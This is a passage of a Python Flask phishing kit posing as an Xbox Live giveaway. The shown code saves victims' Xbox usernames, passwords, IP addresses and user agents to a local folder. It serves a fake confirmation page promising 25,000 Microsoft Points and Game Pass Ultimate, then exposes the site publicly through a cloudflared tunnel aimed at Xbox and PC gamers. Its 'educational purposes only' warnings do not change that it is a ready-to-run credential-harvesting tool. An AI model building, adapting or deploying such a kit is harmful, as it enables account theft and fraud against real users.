        file.write(f"Session: {session_id}\n")
        file.write(f"Xbox Account: {username}\n")
        file.write(f"Password: {password}\n")
        file.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        file.write(f"User-Agent: {request.headers.get('User-Agent', 'Unknown')}\n")
        file.write(f"IP: {request.remote_addr}\n")
        file.write(f"Platform: Xbox Live Giveaway\n")
        file.write(f"Promised: 25,000 Microsoft Points + 1 Year Game Pass Ultimate\n")
        file.write(f"Games Shown: Halo Infinite, Forza Horizon 5, Gears 5, State of Decay 3\n")

    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Processing Game Pass - Xbox Live</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
        <style>
            :root {
                --xbox-green: #107C10;
                --xbox-gold: #FFB900;
            }
            
            * {
                box-sizing: border-box;
            }
            
            body {
                background: linear-gradient(135deg, #000000 0%, #107C10 100%);
                font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
                margin: 0;
                padding: 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #FFFFFF;
                -webkit-text-size-adjust: 100%;
                -webkit-tap-highlight-color: transparent;
            }
            
            .container {
                text-align: center;
                background: rgba(0, 0, 0, 0.9);
                backdrop-filter: blur(10px);
                padding: 30px;
                border-radius: 8px;
                width: 100%;
                max-width: 600px;
                border: 2px solid #107C10;
                box-shadow: 0 8px 32px rgba(16, 124, 16, 0.3);
                margin: 0 auto;
            }
            
            .xbox-logo {
                font-size: 36px;
                font-weight: 800;
                color: white;
                margin-bottom: 15px;
                letter-spacing: 1px;
            }
            
            .xbox-logo-img {
                width: 100px;
                height: auto;
                margin: 0 auto 20px;
                display: block;
                animation: float 3s ease-in-out infinite;
            }
            
            @keyframes float {
                0%, 100% { transform: translateY(0); }
                50% { transform: translateY(-10px); }
            }
            
            .processing-container {
                background: rgba(16, 124, 16, 0.1);
                border: 2px solid var(--xbox-green);
                border-radius: 8px;
                padding: 20px;
                margin: 20px 0;
            }
            
            .progress-container {
                width: 100%;
                height: 6px;
                background: rgba(255, 255, 255, 0.1);
                border-radius: 4px;
                margin: 20px 0;
                overflow: hidden;
            }
            
            .progress-bar {
                height: 100%;
                background: linear-gradient(90deg, #107C10, #5FAF5F, #FFB900);
                border-radius: 4px;
                width: 0%;
                animation: fillProgress 3s ease-in-out forwards;
            }
            
            @keyframes fillProgress {
                0% { width: 0%; }
                100% { width: 100%; }
            }
            
            .gamepass-activated {
                background: rgba(255, 185, 0, 0.1);
                border: 2px solid var(--xbox-gold);
                border-radius: 8px;
                padding: 20px;
                margin: 20px 0;
                text-align: left;
            }
            
            .checkmark {
                color: #5FAF5F;
                font-weight: bold;
                font-size: 18px;
                margin-right: 12px;
                min-width: 20px;
            }
            
            .status-item {
                display: flex;
                align-items: center;
                margin: 15px 0;
                color: #FFFFFF;
                font-size: 16px;
            }
            
            .points-amount {
                font-size: 42px;
                font-weight: 900;
                background: linear-gradient(45deg, #FFB900, #FFD966);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                margin: 15px 0;
                text-shadow: 0 0 20px rgba(255, 185, 0, 0.3);
            }
            
            .points-icon {
                color: #FFD966;
                font-size: 32px;
                margin-right: 8px;
                vertical-align: middle;
            }
            
            .games-added {
                display: grid;
                grid-template-columns: repeat(2, 1fr);
                gap: 12px;
                margin: 20px 0;
            }
            
            .game-item {
                background: rgba(255, 255, 255, 0.03);
                border: 1px solid #333333;
                border-radius: 8px;
                padding: 12px;
                text-align: center;
            }
            
            .game-icon {
                font-size: 20px;
                margin-bottom: 8px;
                color: #5FAF5F;
            }
            
            .transaction-id {
                background: rgba(16, 124, 16, 0.1);
                border: 1px solid #333333;
                border-radius: 4px;
                padding: 8px;
                font-family: 'Consolas', monospace;
                font-size: 11px;
                color: #CCCCCC;
                margin: 12px 0;
                word-break: break-all;
            }
            
            .gamepass-badge {
                background: linear-gradient(45deg, #107C10, #5FAF5F);
                color: white;
                padding: 8px 16px;
                border-radius: 20px;
                font-size: 13px;
                font-weight: 700;
                margin: 15px 0;
                display: inline-block;
            }
            
            h2 {
                margin-bottom: 8px;
                color: #5FAF5F;
                font-size: 24px;
            }
            
            h3 {
                margin-top: 0;
                color: white;
                font-size: 20px;
            }
            
            p {
                color: #CCCCCC;
                font-size: 14px;
                line-height: 1.5;
            }
            
            /* Mobile-specific adjustments */
            @media (max-width: 480px) {
                body {
                    padding: 15px;
                    min-height: -webkit-fill-available;
                }
                
                .container {
                    padding: 20px;
                    width: 100%;
                    max-width: 100%;
                }
                
                .xbox-logo-img {
                    width: 80px;
                }
                
                .xbox-logo {
                    font-size: 32px;
                }
                
                .points-amount {
                    font-size: 36px;
                }
                
                .points-icon {
                    font-size: 28px;
                }
                
                h2 {
                    font-size: 22px;
                }
                
                h3 {
                    font-size: 18px;
                }
                
                .gamepass-badge {
                    font-size: 12px;
                    padding: 6px 12px;
                }
                
                .games-added {
                    grid-template-columns: repeat(2, 1fr);
                    gap: 10px;
                }
                
                .game-item {
                    padding: 10px;
                }
                
                .status-item {
                    font-size: 14px;
                }
                
                .processing-container {
                    padding: 15px;
                }
                
                .gamepass-activated {
                    padding: 15px;
                }
            }
            
            @media (max-width: 360px) {
                .points-amount {
                    font-size: 32px;
                }
                
                .games-added {
                    grid-template-columns: 1fr;
                }
                
                .status-item {
                    font-size: 13px;
                }
            }
            
            /* Prevent text selection */
            .noselect {
                -webkit-touch-callout: none;
                -webkit-user-select: none;
                -khtml-user-select: none;
                -moz-user-select: none;
                -ms-user-select: none;
                user-select: none;
            }
        </style>
        <meta http-equiv="refresh" content="8;url=/" />
    </head>
    <body class="noselect">
        <div class="container">
            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCIgdmlld0JveD0iMCAwIDEwMCAxMDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Ik05My4xMjUgNTIuMjMzM0M5My4xMjUgNjcuNTEyOCA4MC44NzUgODIuMTY4NCA2My4yNSA4OC41ODI2QzU0Ljg3NSA5MS44MzQ3IDQ4Ljg3NSA5Mi43ODQ2IDQzLjc1IDkyLjc4NDZDNDAuNjI1IDkyLjc4NDYgMzcuNSA5Mi40MTgyIDM0LjM3NSA5MS42ODU0QzI3LjEyNSA4OS44OTE2IDIyLjUgODguNTgyNiAxNi41IDg2LjU5MzhDMTUuMzc1IDg2LjE2MDcgMTQuMjUgODUuNzI3NiAxMi41IDg1LjEwM0MxMS4zNzUgODQuNTY5OSA5LjM3NSA4My42NCA4LjEyNSA4Mi4zMDMxQzcuNSAxNy4wNDE5IDMxLjg3NSAzLjEyNSA0OC4xMjUgMy4xMjVDNjMuMjUgMy4xMjUgNzYuODc1IDEzLjQzMTIgODIuNSAyNy4yMjg4Qzg4LjEyNSAzNy41MDI3IDg4LjEyNSA1MC4xODc1IDgyLjUgNjAuMDY2M0M4Ny4zNzUgNTkuNzMyOCA5MC42MjUgNTguMDYzMyA5My4xMjUgNTIuMjMzM1oiIGZpbGw9IiMxMDdDMTAiLz4KPHBhdGggZD0iTTE0LjI1IDc0LjE2NTdDMTUuNjI1IDc0LjQ5OTIgMTYuNSA3NC44MzI3IDE4LjEyNSA3NS4yNjU4QzIzLjI1IDc2LjgwOTYgMjcuMTI1IDc3Ljk2NjkgMzMuNzUgNzkuNTEwN0M0NC42MjUgODIuMTY4NCA1My43NSA4Mi41MDIgNjAuMzc1IDgwLjMyMzFDNjMuNSA3OS40MzAzIDY2LjI1IDc4LjEwMjMgNzAuMzc1IDc1Ljk1MjNDNzQuNSA3My44MDIzIDc3LjI1IDcyLjM1NzggODAgNzAuMDE5OEM4Mi43NSA2Ny42ODE4IDg1IDY0LjY1MjMgODYuMjUgNjAuNzIyMkM4Ny41IDU2Ljc5MiA4Ny41IDUxLjc3MTIgODYuMjUgNDcuMzk2M0M4NS4zNzUgNDQuMTg4MiA4NC4xMjUgNDIuMDM4MiA4My4xMjUgMzkuODg4MkM4Mi4xMjUgMzcuNzM4MiA4MS41IDM2LjEwMzEgODEuNSAzMy41ODI2QzgxLjUgMzAuMzkzOCA4My4xMjUgMjguNTE5MyA4NS4zNzUgMjcuMjI4OEM4Ny42MjUgMjUuOTM4MyA5MC4yNSAyNS44MDUxIDkyLjg3NSAyNy4yMjg4QzkzLjUgMjcuNTYyMyA5My43NSAyOC4wOTU0IDkzLjUgMjguNTAyN0M5My4xMjUgMjkuMjk2NSA5Mi42MjUgMzAuMjMxMiA5Mi4xMjUgMzEuMDI1QzkxLjYyNSAzMS44MTg4IDkxIDMyLjY3OTkgOTAuMzc1IDMzLjI4MDFDODguNSAzNS4wMzA4IDg2LjI1IDM1Ljk3NDIgODQuMzc1IDM3LjU4MjdDODIuNSA0NS4zNzEyIDc5LjM3NSA1My4xNiA3NC4zNzUgNjAuMDY2M0M3MC4zNzUgNjUuNDUxMSA2NS42MjUgNjkuMDMxMiA2MC4zNzUgNzEuMTc4N0M1NS4xMjUgNzMuMzI2MiA0OS4zNzUgNzMuOTkyOSA0My43NSA3My4xNDkzQzM4LjEyNSA3Mi4zMDU3IDMzLjEyNSA3MC4wMTk4IDI5LjM3NSA2Ny4wMDM1QzI1LjYyNSA2My45ODcyIDIzLjEyNSA2MC4yNDUyIDIxLjg3NSA1Ni4yMjE4QzIwLjYyNSA1Mi4xOTg0IDIwLjYyNSA0OC4wNDg2IDIxLjg3NSA0NC4xODgyQzIzLjEyNSA0MC4zMjc4IDI1LjYyNSAzNy4xMjU2IDI5LjM3NSAzNC4zODAxQzMzLjEyNSAzMS42MzQ3IDM4LjEyNSAyOS40MTU3IDQzLjc1IDI4LjU3MjFDNDkuMzc1IDI3LjcyODUgNTUuMTI1IDI4LjM5NTIgNjAuMzc1IDMwLjU0MjdDNjUuNjI1IDMyLjY5MDIgNzAuMzc1IDM2LjI3MDMgNzQuMzc1IDQxLjY1NTFDNzcuMjUgNDUuNTEyNSA4MCA1MC4xODc1IDgyLjEyNSA1NC41NTE3QzgwLjg3NSA1NC43ODUxIDc5LjYyNSA1NS4wMTg1IDc4LjEyNSA1NS4wMTg1Qzc2LjYyNSA1NS4wMTg1IDc1LjM3NSA1NC42ODUgNzQuMzc1IDU0LjAxODNDNzMuMzc1IDUzLjM1MTYgNzIuNjI1IDUyLjIyMzMgNzIuNjI1IDUwLjY2NjhDNzIuNjI1IDQ5LjE4NzUgNzMuNSA0Ny45MzM2IDc1LjM3NSA0Ny4wMTg1Qzc3LjI1IDQ2LjEwMzUgNzkuODc1IDQ1Ljk3MDMgODIuMTI1IDQ3LjA2MDRDODIuNjI1IDQ3LjI5MzggODIuODc1IDQ3Ljc5MzggODIuNzUgNDguMzYwNkM4Mi41IDQ5LjI2NDkgODIuMTI1IDUwLjIzNjQgODEuNjI1IDUxLjA3MzVDODAuNSA0OC4wNDg2IDc4Ljc1IDQ1LjA1MDcgNzYuMjUgNDIuMzE4OEM3My43NSAzOS41ODY5IDcwLjUgMzcuMTI1NiA2Ny4yNSAzNS4zNDUyQzY0IDMzLjU2NDggNjAuMzc1IDMyLjQ2NDIgNTYuMjUgMzEuOTk3N0M1Mi4xMjUgMzEuNTMxMiA0OC4xMjUgMzEuNzk4IDQ0LjM3NSAzMi44MDIzQzQwLjYyNSAzMy44MDY2IDM3LjM3NSAzNS41MjM5IDM0Ljc1IDM3Ljg4MTlDMzIuMTI1IDQwLjIzOTkgMzAuMjUgNDMuMTY4NCAyOS4zNzUgNDYuNzMzNEMyOC41IDUwLjI5ODQgMjguNSA1NC4zMjE4IDI5LjM3NSA1Ny43NTQyQzMwLjI1IDYxLjE4NjYgMzIuMTI1IDY0LjExNTEgMzQuNzUgNjYuNDczMUMzNy4zNzUgNjguODMxMSA0MC42MjUgNzAuNTQ4NCA0NC4zNzUgNzEuNTUyN0M0OC4xMjUgNzIuNTU3IDUyLjEyNSA3Mi44MjM4IDU2LjI1IDcyLjM1NzNDNjAgNzEuODkwOCA2My42MjUgNzAuNzkwMiA2Ni44NzUgNjkuMDE2M0M3MC4xMjUgNjcuMjQyNCA3Mi43NSA2NC43OTkgNzUuMjUgNjEuNjY5NEM3Ny43NSA1OC41Mzk5IDc5LjUgNTUuMDE4NSA4MC44NzUgNTEuMDczNUM4MC44NzUgNTEuNTczNSA4MS4xMjUgNTIuMDczNSA4MS4zNzUgNTIuNDA3QzgxLjYyNSA1Mi43NDA1IDgyLjEyNSA1My4wNzQgODIuNjI1IDUzLjA3NEM4My43NSA1My4wNzQgODQuNSA1Mi4yMjMzIDg0LjUgNTAuOTcwOEM4NC41IDQ5LjcxODMgODMuNzUgNDguNTcwMSA4Mi41IDQ3Ljc5MzZDODEuMjUgNDcuMDE3MSA3OS42MjUgNDYuNzMzNCA3OC4xMjUgNDcuMTY2NUM3Ni42MjUgNDcuNTk5NiA3NS4zNzUgNDguNzI4IDc1LjM3NSA1MC4wMTg1Qzc1LjM3NSA1MS4xMDM1IDc2LjI1IDUyLjA3MzUgNzcuNjI1IDUyLjU3MzVDNzkuMDAxIDUzLjA3MzUgODAuNzUxIDUzLjA3MzUgODIuMTI1IDUyLjMzMzZDODIuODc1IDUyLjAwMDEgODMuMjUgNTEuMjMzNCA4My4zNzUgNTAuMzMzQzgzLjM3NSA0OC4wNDg2IDgxLjI1IDQ0LjUxNzMgNzcuNjI1IDQwLjM5MzlDNzMuMzc1IDM1LjY1NzkgNjcuNSAzMi43MTM5IDYwLjM3NSAzMS4yNzAxQzUzLjI1IDI5LjgyNjMgNDYuMjUgMzAuNDkzIDQwIDMzLjE1MDhDMzMuNzUgMzUuODA4NSAyOC4zNzUgNDAuNDE4IDI0Ljg3NSA0Ni4xNDQxQzIxLjM3NSA1MS44NzAyIDE5Ljc1IDU4LjU2ODcgMjAuNjI1IDY1LjQ1MTFDMjEuNSA3Mi4zMzM1IDI0Ljg3NSA3OS4xMjkgMjkuMzc1IDg0LjA1MjdDMzMuODc1IDg4Ljk3NjQgMzkuNSA5Mi4wMDYgNDUuNjI1IDkyLjg0OTZDNTEuNzUgOTMuNjkyNSA1Ny4zNzUgOTIuNzg0NiA2My4xMjUgOTAuMDgxOUM2OC44NzUgODcuMzc5MiA3My4zNzUgODMuMDE1MSA3Ny4yNSA3Ny45NjY5QzgxLjEyNSA3Mi45MTg3IDg0LjM3NSA2Ny4yNDI0IDg2Ljg3NSA2MC44NDk5Qzg3Ljc1IDU4LjU2ODcgODguMzc1IDU2LjM1MjMgODguNjI1IDU0LjA2NzlDODguNjI1IDUzLjUzNDggODguODc1IDUzLjA3NCA4OS4zNzUgNTIuODA3MkM5MC4yNSAyMS4zODIzIDcxLjg3NSA5LjQzMTg3IDUxLjg3NSA5LjQzMTg3QzQwLjYyNSA5LjQzMTg3IDI5Ljc1IDE1LjU4NTQgMjMuNSAyNS44MDUxQzE3LjI1IDM2LjAyNDggMTcuMjUgNDkuMjg5NyAyMy41IDU5LjUwOTRDMjguNzUgNjcuNjgxOCAzNi42MjUgNzMuNDk5MiA0Ni4xMjUgNzUuNDMyNkM1Mi44NzUgNzYuNjQ2MiA1OC43NSA3UuMjY1OCA2My42MjUgNzIuNzI4OEM2Ni42MjUgNzEuMjg1MSA2OS4yNSA2OS4zNDg3IDcyLjUgNjcuNTY4NEM3NS43NSA2NS43ODggNzguNjI1IDY0LjAwNzYgODEuMTI1IDYxLjQzMTlDODMuNjI1IDU4Ljg1NjIgODUuNSA1NS40NTExIDg2LjYyNSA1MS4wNzM1Qzg3Ljc1IDQ2LjY5NTkgODcuNzUgNDEuOTM1NyA4Ni42MjUgMzcuNTgyN0M4NS41IDMzLjIyOTcgODMuNjI1IDI5Ljc1MDUgODEuMTI1IDI3LjE3NDhDNzguNjI1IDI0LjU5ODEgNzUuNzUgMjIuODE3NyA3Mi41IDIxLjAzNzNDNjkuMjUgMTkuMjU2OSA2Ni42MjUgMTcuNzE5OSA2My42MjUgMTYuNDczMUM2Mi41IDE1LjkzOTkgNjEuMTI1IDE1LjgwNjcgNTkuODc1IDE2LjE0MDJDNTguNjI1IDE2LjQ3MzcgNTcuNSAxNy4zMTczIDU2Ljg3NSAxOC40MjQxQzU2LjI1IDE5LjUzMDkgNTYuMTI1IDIwLjc2NzIgNTYuNjI1IDIxLjcwODdDNTcuMTI1IDIyLjY1MDIgNTguMTI1IDIzLjM2OTIgNTkuMzc1IDIzLjU2ODdDNjEuNjI1IDI0LjAzNTIgNjMuMjUgMjQuOTc2NyA2NC43NSAyNi4wODM1QzY2LjI1IDI3LjE5MDMgNjcuNSAyOC42MzQxIDY4LjUgMzAuMjQyNkM2OS41IDMxLjg1MTEgNzAuMzc1IDMzLjYzMTUgNzEuMjUgMzUuNDExOUM3Mi4xMjUgMzcuMTkyMyA3Mi44NzUgMzkuMDM2MiA3My41IDQwLjg4M0M3NC4xMjUgNDIuNzI5OCA3NC42MjUgNDQuNTc2NiA3NSA0Ni4yODAyQzc1LjM3NSA0Ny45ODM5IDc1LjYyNSA0OS42NTA0IDc1LjYyNSA1MS4xNzAxQzc1LjYyNSA1Mi42ODk4IDc1LjM3NSA1NC4wNjc5IDc1IDU1LjMwNDJDNzQuNjI1IDU2LjU0MDUgNzQgNTcuNzUwNiA3My4zNzUgNTguNzkyM0M2OS4zNzUgNjUuMTIxNSA2Mi44NzUgNjkuMDMxMiA1NS4zNzUgNjkuOTQ2MkM0Ny44NzUgNzAuODYxMiA0MC42MjUgNjguMDczOCAzNC4zNzUgNjIuOTMxM0MyOC4xMjUgNTcuNzg4OCAyMy43NSA1MC41NTUzIDIyLjEyNSA0Mi40ODA2QzIwLjUgNDQuNTE3MyAyMC41IDQ4LjA0ODYgMjIuMTI1IDUyLjk3MDNDMjMuNzUgNTcuODkyIDI3LjUgNjMuNDE1MyAzMy4xMjUgNjcuMDAzNUMzOC43NSA3MC41OTE3IDQ1LjYyNSA3Mi4wODY0IDUyLjI1IDcwLjY4OTNDNTguODc1IDY5LjI5MTUgNjQuMzc1IDY1LjEyMTUgNjcuODc1IDU5LjE5NTVDNzAuMTI1IDU1LjIzMTggNzEuNSA1MC41MTg1IDcxLjYyNSA0NS42MTkyQzcxLjc1IDQwLjcxOTkgNzAuNjI1IDM1LjkxMTMgNjguMzc1IDMxLjY4NDNDNjYuMTI1IDI3LjQ1NzMgNjIuODc1IDIzLjg3NzIgNTkuMzc1IDIxLjMxNDlDNTUuODc1IDE4Ljc1MjYgNTIuMTI1IDE3LjEwNTEgNDguMzc1IDE2LjQ3MzdDNDQuNjI1IDE1Ljg0MjMgNDEuMTI1IDE2LjMwODggMzguMTI1IDE3Ljc4ODFDMzUuMTI1IDE5LjI2NzQgMzIuODc1IDIxLjU2MzEgMzEuNjI1IDI0LjU3NTJDMzAuMzc1IDI3LjU4NzMgMzAuMzc1IDMxLjE2NzQgMzEuNjI1IDM0LjU0MjNDMzIuODc1IDM3LjkxNzMgMzUuMzc1IDQwLjgxMzggMzguNzUgNDIuODgwOEM0Mi4xMjUgNDQuOTQ3OCA0Ni4yNSA0Ni4xODQxIDUwLjM3NSA0Ni40MTc2QzU0LjUgNDYuNjUxIDU4LjYyNSA0NS44NDA4IDYyLjI1IDQ0LjI0NzVDNjUuODc1IDQyLjY1NDIgNjguODc1IDQwLjM5MiA3MS4yNSAzNy41ODI3QzczLjYyNSAzNC43NzM0IDc1LjM3NSAzMS40MjI0IDc2LjUgMjcuNzY5MUM3Ny42MjUgMjQuMTE1OCA3OC4xMjUgMjAuMjUzNiA3Ny44NzUgMTYuMzkxM0M3Ny42MjUgMTIuNTI5IDc2LjYyNSA4Ljg5Mjk3IDc1IDUuNjE4NTlDNzMuMzc1IDIuNDAyMTQgNzAuNjI1IDAgNjcuMjUgMEM2My44NzUgMCA2MS4yNSAyLjcwMjU3IDYwLjUgNy4wNzQwNEM1OS4zNzUgMTMuNzExNSA1NS4zNzUgMTkuMTQ1NyA0OS4zNzUgMjEuMzE0OUM0My4zNzUgMjMuNDg0MSAzNi43NSAyMi4xODA2IDMxLjc1IDE3Ljc4ODFDMjYuNzUgMTMuMzk1NiAyMy43NSA2LjI3NjExIDIzLjc1IDBIMTQuMjVIMTQuMjVDMTQuMjUgNi44OTMwNCAxNy4yNSAxMy44NzkgMjIuMTI1IDE5LjYxN0MyNyAyNS4zNTUgMzMuMzc1IDI5LjQ3MjcgNDAuMzc1IDMxLjIwMTNDNDcuMzc1IDMyLjkyOTkgNTQuNjI1IDMyLjE1MzQgNjAuODc1IDI5LjAzMjdDNjcuMTI1IDI1LjkxMiA3MS44NzUgMjAuNTI3NCA3NC4zNzUgMTQuMTM0OEM3Ni44NzUgNy43NDIyNSA3Ni44NzUgMC42MTYzODkgNzQuMzc1IDBINjRINjRDNjEuNzUgMCA1OS41IDIuNjkyNjQgNTguNzUgNy4wNzQwNEM1Ny42MjUgMTIuNTk3MyA1My44NzUgMTcuMjgwOCA0OC43NSAxOS40ODE2QzQzLjYyNSAyMS42ODI0IDM3Ljc1IDIwLjkxMDIgMzMuMTI1IDE3Ljc4ODFDMjguNSAxNC42NjYgMjUuNjI1IDkuNTk1NyAyNS42MjUgMy45NTY5NUgxNC4yNUgxNC4yNUMxNC4yNSAxMi40MTM5IDE4LjEyNSAyMC41ODA3IDI0Ljc1IDI3LjA5NjJDMzEuMzc1IDMzLjYxMTcgNDAuMjUgMzcuOTQ2MiA0OS42MjUgMzkuMzQzMEM1OSA0MC43Mzk4IDY4LjM3NSAzOS4wOTIzIDc2LjI1IDM0LjgwNjhDODQuMTI1IDMwLjUyMTMgOTAuMTI1IDIzLjc2MjcgOTMuMTI1IDE1LjkzMDhDOTYuMTI1IDguMDk4OTYgOTYuMTI1IC0wLjU0MDcyOSA5My4xMjUgOC40MDk3N1Y1Mi4yMzMzWiIgZmlsbD0id2hpdGUiLz4KPC9zdmc+Cg==" alt="Xbox Logo" class="xbox-logo-img">
            
            <div class="xbox-logo">Xbox</div>
            
            <div class="gamepass-badge">
                ✅ XBOX GAME PASS ULTIMATE ACTIVATED
            </div>
            
            <div class="points-amount">
                <span class="points-icon">💰</span>25,000
            </div>
            
            <h2>Game Pass & Points Added!</h2>
            <p>Your Xbox benefits are being activated</p>
            
            <div class="processing-container">
                <h3>Processing Your Xbox Giveaway</h3>
                <div class="progress-container">
                    <div class="progress-bar"></div>
                </div>
                <p>Adding Microsoft Points and activating Game Pass...</p>
            </div>
            
            <div class="games-added">
                <div class="game-item">
                    <div class="game-icon">🎮</div>
                    <div>Halo Infinite</div>
                </div>
                <div class="game-item">
                    <div class="game-icon">⚔️</div>
                    <div>Forza Horizon 5</div>
                </div>
                <div class="game-item">
                    <div class="game-icon">🛡️</div>
                    <div>Gears 5</div>
                </div>
                <div class="game-item">
                    <div class="game-icon">🧟</div>
                    <div>State of Decay 3</div>
                </div>
            </div>
            
            <div class="transaction-id">
                Transaction ID: XBOX-<span id="transaction-id">0000000</span>
            </div>
            
            <div class="gamepass-activated">
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>25,000 Points</strong> added to Microsoft account
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>Game Pass Ultimate</strong> - 1 Year Subscription
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>4 Xbox Games</strong> added to your library
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>Cloud Gaming</strong> - Xbox Cloud Gaming access
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>EA Play Premium</strong> - Included with subscription
                </div>
            </div>
            
            <p>
                You will be redirected to Xbox Live...
                <br>
                <small style="color: #666666; font-size: 12px;">Your benefits will be available on Xbox, PC, and Cloud Gaming within 24 hours</small>
            </p>
        </div>
        
        <script>
            // Generate random transaction ID
            document.getElementById('transaction-id').textContent = 
                Math.floor(Math.random() * 10000000).toString().padStart(7, '0');
            
            // Animate points amount
            setTimeout(() => {
                const pointsAmount = document.querySelector('.points-amount');
                pointsAmount.style.transform = 'scale(1.1)';
                pointsAmount.style.transition = 'transform 0.3s';
                setTimeout(() => {
                    pointsAmount.style.transform = 'scale(1)';
                }, 300);
            }, 1500);
            
            // Animate added games
            const gameItems = document.querySelectorAll('.game-item');
            gameItems.forEach((item, index) => {
                item.style.opacity = '0';
                setTimeout(() => {
                    item.style.transition = 'opacity 0.5s';
                    item.style.opacity = '1';
                }, index * 300);
            });
            
            // Mobile viewport adjustment
            function setViewportHeight() {
                let vh = window.innerHeight * 0.01;
                document.documentElement.style.setProperty('--vh', vh + 'px');
            }
            
            setViewportHeight();
            window.addEventListener('resize', setViewportHeight);
            window.addEventListener('orientationchange', setViewportHeight);
        </script>
    </body>
    </html>
    ''')

def run_cloudflared_tunnel(local_url):
    cmd = ["cloudflared", "tunnel", "--url", local_url]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    for line in process.stdout:
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"🎮 Xbox Live Public Link: {tunnel_url}")
            print(f"💰 Promising: 25,000 FREE Microsoft Points + 1 Year Game Pass Ultimate")
            print(f"💾 Credentials saved to: {BASE_FOLDER}")
            print("⚠️  WARNING: For educational purposes only!")
            print("⚠️  NEVER enter real Xbox/Microsoft credentials!")
            print("⚠️  Xbox accounts have significant financial and gaming value!")
            print("⚠️  Game Pass phishing scams target millions of gamers!")
            print("-" * 50)
            sys.stdout.flush()
            break
    
    return process

if __name__ == '__main__':
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr
    sys.stdout = DummyFile()
    sys.stderr = DummyFile()

    def run_flask():
        app.run(host='0.0.0.0', port=5014, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    time.sleep(2)
    sys.stdout = sys_stdout
    sys.stderr = sys_stderr

    print("🚀 Starting Xbox Live Giveaway Page...")
    print("📱 Port: 5014")
    print("💾 Save location: ~/storage/downloads/XboxLive/")
    print("💰 Promising: 25,000 FREE Microsoft Points")
    print("🎮 Bonus: 1 Year Xbox Game Pass Ultimate + 4 Free Games")
    print("🎯 Target: Xbox Series X/S, Xbox One, PC, and Cloud Gaming users")
    print("⚠️  WARNING: Xbox Game Pass scams are extremely common!")
    print("⏳ Waiting for cloudflared tunnel...")
    
    cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5014")

    try:
        cloudflared_process.wait()
    except KeyboardInterrupt:
        cloudflared_process.terminate()
        print("\n👋 Server stopped")
        sys.exit(0)